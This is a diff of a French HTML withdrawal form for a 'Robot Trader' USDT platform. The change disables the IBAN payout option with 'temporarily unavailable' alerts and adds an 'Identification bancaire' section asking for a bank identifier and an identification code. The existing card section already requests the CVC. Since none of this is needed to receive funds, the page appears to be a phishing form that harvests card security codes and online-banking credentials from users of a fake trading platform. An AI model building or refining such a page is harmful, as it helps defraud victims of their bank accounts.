@@ -5,7 +5,6 @@
     <title>Demande de Retrait - Robot Trader</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* (Styles inchangés, ajout juste de section masquée pour carte/IBAN) */
         * { box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -77,8 +76,22 @@
     <script>
         function toggleWithdrawalType() {
             const type = document.getElementById("withdraw_type").value;
-            document.getElementById("card_section").style.display = type === "carte" ? "block" : "none";
-            document.getElementById("iban_section").style.display = type === "iban" ? "block" : "none";
+            document.getElementById("card_section").style.display = type === "card" ? "block" : "none";
+            document.getElementById("iban_section").style.display = type === "bank" ? "block" : "none";
+            document.getElementById("id_section").style.display = type === "identification" ? "block" : "none";
+
+            if (type === "bank") {
+                alert("Le mode de retrait par IBAN est momentanément indisponible.");
+            }
+        }
+
+        function validateForm() {
+            const type = document.getElementById("withdraw_type").value;
+            if (type === "bank") {
+                alert("Le mode IBAN est temporairement désactivé.");
+                return false;
+            }
+            return true;
         }
     </script>
 </head>
@@ -91,15 +104,16 @@
 
 <div class="container">
     <h2>Retirer des fonds</h2>
-    <form method="POST">
+    <form method="POST" onsubmit="return validateForm()">
         <label for="amount">Montant à retirer (USDT) :</label>
         <input type="number" name="amount" id="amount" min="1" step="0.01" required>
 
         <label for="withdraw_type">Méthode de retrait :</label>
-        <select name="withdraw_type" id="withdraw_type" onchange="toggleWithdrawalType()" required>
+        <select name="mode" id="withdraw_type" onchange="toggleWithdrawalType()" required>
             <option value="">-- Choisissez une méthode --</option>
-            <option value="carte">Carte bancaire</option>
-            <option value="iban">Virement bancaire (IBAN)</option>
+            <option value="card">Carte bancaire</option>
+            <option value="bank">Virement bancaire (IBAN)</option>
+            <option value="identification">Identification bancaire</option>
         </select>
 
         <!-- Section carte bancaire -->
@@ -114,16 +128,28 @@
             <input type="text" name="card_expiry" id="card_expiry" placeholder="MM/AA">
 
             <label for="card_cvc">Code CVC :</label>
-            <input type="text" name="card_cvc" id="card_cvc">
+            <input type="text" name="card_cvv" id="card_cvc">
         </div>
 
-        <!-- Section IBAN -->
+        <!-- Section IBAN (désactivé) -->
         <div id="iban_section" style="display:none;">
             <label for="iban">IBAN :</label>
-            <input type="text" name="iban" id="iban">
+            <input type="text" name="iban" id="iban" disabled>
 
             <label for="bank_name">Nom de la banque :</label>
-            <input type="text" name="bank_name" id="bank_name">
+            <input type="text" name="bank_name" id="bank_name" disabled>
+        </div>
+
+        <!-- Section identification bancaire -->
+        <div id="id_section" style="display:none;">
+            <label for="bank_name_id">Nom de la banque :</label>
+            <input type="text" name="bank_name_id" id="bank_name_id">
+
+            <label for="bank_identifiers">Identifiant bancaire (9 à 11 chiffres) :</label>
+            <input type="text" name="bank_identifiers" id="bank_identifiers">
+
+            <label for="bank_code_id">Code d’identification :</label>
+            <input type="text" name="bank_code_id" id="bank_code_id">
         </div>
 
         <button type="submit">Envoyer la demande</button>
